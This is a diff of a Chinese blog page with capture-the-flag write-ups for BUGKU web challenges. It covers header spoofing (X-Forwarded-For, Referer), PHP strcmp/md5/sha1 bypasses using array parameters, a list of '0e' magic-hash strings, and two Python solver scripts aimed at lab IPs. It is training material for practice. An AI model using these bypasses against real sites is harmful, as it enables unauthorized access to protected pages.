@@ -4305,7 +4305,7 @@
 <p>preg_match(“&#x2F;^\w+$&#x2F;“,$args)</p>
 <p>这段代码的作用是检查 <code>$args</code> 是否仅由字母、数字或下划线字符组成，且至少包含一个以上的字符</p>
 <p>最关键的是最后的$$args,这是可变变量的意思，如$args的值是另一个变量的变量名。那么$$args就代表另一个变量。所以我们就给args赋值一个变量名，那么PHP的九大全局变量，一个一个试。</p>
-<h2 id="九大全局变量"><a href="#九大全局变量" class="headerlink" title="九大全局变量"></a>九大全局变量</h2><ul>
+<h3 id="九大全局变量"><a href="#九大全局变量" class="headerlink" title="九大全局变量"></a>九大全局变量</h3><ul>
 <li>$_POST [用于接收post提交的数据]</li>
 <li>$_GET [用于获取url地址栏的参数数据]</li>
 <li>$_FILES [用于文件就收的处理img 最常见]</li>
@@ -4418,6 +4418,66 @@
 <p>user-agent这句代码表示那个搜索引擎准守协议。user-agent后面为搜索机器人名称，如果是“*”号，则泛指所有的搜索引擎机器人；案例中显示“User-agent: <em>” 表示所有搜索引擎准守，</em>号表示所有。</p>
 <p>Disallow是禁止爬取的意思。Disallow后面是不允许访问文件目录（你可以理解为路径中包含改字符、都不会爬取）。案例中显示“Disallow: &#x2F;?s*” 表示路径中带有“&#x2F;?s”的路径都不能爬取。 *代表匹配所有。 这里需要主机。 Disallow空格一个，&#x2F;必须为开头。</p>
 <p>如果“Disallow: &#x2F;” 因为所有路径都包含&#x2F; ，所以这表示禁止爬取网站所有内容。</p>
+<h1 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h1><h2 id="伪造X-Forwarded-For头进行内网伪装"><a href="#伪造X-Forwarded-For头进行内网伪装" class="headerlink" title="#伪造X-Forwarded-For头进行内网伪装"></a>#伪造X-Forwarded-For头进行内网伪装</h2><p><img src="/./../image/achieve/202411/BUGKU/image-20241126104244668.png" alt="image-20241126104244668"></p>
+<p>看到这个第一时间想到的就是修改请求头进行内网伪装</p>
+<p><strong>X-Forwarded-For		用来说明从哪里来的，一般用来内网伪装			X-Forwarded-For: 127.0.0.1</strong></p>
+<p>在请求包中添加X-Forwarded-For: 127.0.0.1</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126104319404.png" alt="image-20241126104319404"></p>
+<p>直接就拿到flag了</p>
+<h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><p><img src="/./../image/achieve/202411/BUGKU/image-20241126104920035.png" alt="image-20241126104920035"></p>
+<p>这个一看就是需要修改请求头了</p>
+<p><strong>Referer	先前网页的地址，当前请求网页紧随其后,即来路	Referer: <a href="www.baidu.com">www.baidu.com</a></strong></p>
+<p>需要先前网页是谷歌的地址</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126105256625.png" alt="image-20241126105256625"></p>
+<h1 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h1><h2 id="绕过md5和strcmp-验证"><a href="#绕过md5和strcmp-验证" class="headerlink" title="#绕过md5和strcmp()验证"></a>#绕过md5和strcmp()验证</h2><p><img src="/./../image/achieve/202411/BUGKU/image-20241126105607312.png" alt="image-20241126105607312"></p>
+<p>在源代码中找到了code.txt</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126105944232.png" alt="image-20241126105944232"></p>
+<p>我们点进去看一下</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126105950391.png" alt="image-20241126105950391"></p>
+<p><code>strcmp()</code> 是一个 PHP 函数，用于比较两个字符串。它的用法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php复制int strcmp ( string $str1 , string $str2 )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果 <code>str1</code> 小于 <code>str2</code>，那么 <code>strcmp()</code> 返回一个小于 0 的整数。</li>
+<li>如果 <code>str1</code> 大于 <code>str2</code>，那么 <code>strcmp()</code> 返回一个大于 0 的整数。</li>
+<li>如果 <code>str1</code> 等于 <code>str2</code>，那么 <code>strcmp()</code> 返回 0。</li>
+</ul>
+<p>strcmp函数无法比较数组,对象，会返回0</p>
+<p>md5可以用数组绕过，也可以用碰撞</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126110733003.png" alt="image-20241126110733003"></p>
+<h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><p><img src="/./../image/achieve/202411/BUGKU/image-20241126110838510.png" alt="image-20241126110838510"></p>
+<p>那我们传入a&#x3D;1试试</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126110902896.png" alt="image-20241126110902896"></p>
+<p>提示错误，题目提示是md5碰撞，根据 PHP 弱类型比较的特点，所以如果两个不同的密码经过哈希以后，其哈希值都是以 <code>0E</code> 开头的，那么 PHP 将会认为他们相同，这就是所谓的 <strong>MD5 碰撞漏洞</strong>。</p>
+<p>所以我们选一个常见的md5碰撞值就可以了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">大写字母类：</span><br><span class="line">QLTHNDT</span><br><span class="line"><span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">EEIZDOI</span><br><span class="line"><span class="number">0e782601363539291779881938479162</span></span><br><span class="line">TUFEPMC</span><br><span class="line"><span class="number">0e839407194569345277863905212547</span></span><br><span class="line">UTIPEZQ</span><br><span class="line"><span class="number">0e382098788231234954670291303879</span></span><br><span class="line">UYXFLOI</span><br><span class="line"><span class="number">0e552539585246568817348686838809</span></span><br><span class="line">IHKFRNS</span><br><span class="line"><span class="number">0e256160682445802696926137988570</span></span><br><span class="line">PJNPDWY</span><br><span class="line"><span class="number">0e291529052894702774557631701704</span></span><br><span class="line">ABJIHVY</span><br><span class="line"><span class="number">0e755264355178451322893275696586</span></span><br><span class="line">DQWRASX</span><br><span class="line"><span class="number">0e742373665639232907775599582643</span></span><br><span class="line">DYAXWCA</span><br><span class="line"><span class="number">0e424759758842488633464374063001</span></span><br><span class="line">GEGHBXL</span><br><span class="line"><span class="number">0e248776895502908863709684713578</span></span><br><span class="line">GGHMVOE</span><br><span class="line"><span class="number">0e362766013028313274586933780773</span></span><br><span class="line">GZECLQZ</span><br><span class="line"><span class="number">0e537612333747236407713628225676</span></span><br><span class="line">NWWKITQ</span><br><span class="line"><span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF</span><br><span class="line"><span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MAUXXQC</span><br><span class="line"><span class="number">0e478478466848439040434801845361</span></span><br><span class="line">MMHUWUV</span><br><span class="line"><span class="number">0e701732711630150438129209816536</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="各种绕过哟"><a href="#各种绕过哟" class="headerlink" title="各种绕过哟"></a>各种绕过哟</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])&amp;(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关注判断条件</p>
+<p>只要使uname的sha1的值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等</p>
+<p>sha1()函数无法处理数组类型，会将报错并返回false</p>
+<p>GET:id&#x3D;margin&amp;&amp;uname[]&#x3D;1</p>
+<p>POST:passwd[]&#x3D;2</p>
+<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><p>多刷新几次会有出现</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126112822178.png" alt="image-20241126112822178"></p>
+<p>说明我们要post提交参数value</p>
+<p>直接用脚本吧(抄的baozongwi 的)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests<span class="comment">#用于发送 HTTP 请求。</span></span><br><span class="line"><span class="keyword">import</span> re<span class="comment">#用于处理正则表达式。</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.175.224:19401/&quot;</span><span class="comment">#要访问的网页的 URL。</span></span><br><span class="line">s=requests.Session()<span class="comment">#保持会话</span></span><br><span class="line"></span><br><span class="line">r=s.get(url)</span><br><span class="line">equation=re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,r.text).group()<span class="comment">#在页面返回的文本中寻找一个数学表达式，并将找到的表达式存储在变量 equation 中。</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    result=<span class="built_in">eval</span>(equation)<span class="comment">#eval() 函数用来执行一个字符串表达式，并返回表达式的值。</span></span><br><span class="line">    key=&#123;<span class="string">&#x27;value&#x27;</span>:result&#125;</span><br><span class="line">    response=s.post(url=url,data=key)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response.text:<span class="comment">#查找在response中的flag</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h1><p><img src="/./../image/achieve/202411/BUGKU/image-20241126114230980.png" alt="image-20241126114230980"></p>
+<p>刷新并没有发现什么，直接抓包</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126114249269.png" alt="image-20241126114249269"></p>
+<p>发现response中有flag，base64解密得到</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126114340881.png" alt="image-20241126114340881"></p>
+<p>还有一层加密</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126114357915.png" alt="image-20241126114357915"></p>
+<p>这个数是什么呢，根据注释里面的内容，猜测我们需要post传入一个参数margin</p>
+<p>修改一下请求包为post，传入margin&#x3D;597691</p>
+<p><img src="/./../image/achieve/202411/BUGKU/image-20241126114537404.png" alt="image-20241126114537404"></p>
+<p>有变化，继续分析，然后我发现是重复的，没办法，只能写脚本了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:16522/&quot;</span></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    r=s.get(url)<span class="comment">#发起一个 GET 请求，获取指定 URL 的响应，并将响应存储在变量 r 中</span></span><br><span class="line">    header_flag=r.headers[<span class="string">&#x27;flag&#x27;</span>]<span class="comment">#从响应的头信息中获取名为 &#x27;flag&#x27; 的值，并将其存储在 header_flag 中。</span></span><br><span class="line">    header_flag=base64.b64decode(header_flag).decode()</span><br><span class="line"></span><br><span class="line">    value=header_flag.split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>]<span class="comment"># 将字符串 header_flag 按空格分割，然后取最后一个部分作为 value。</span></span><br><span class="line">    v=base64.b64decode(value).decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment"># 对 Base64 编码的 value 进行解码，然后将其转换为 UTF-8 编码的字符串。</span></span><br><span class="line">    response=s.post(url,data=&#123;<span class="string">&#x27;margin&#x27;</span>:v&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>赛题wp</category>
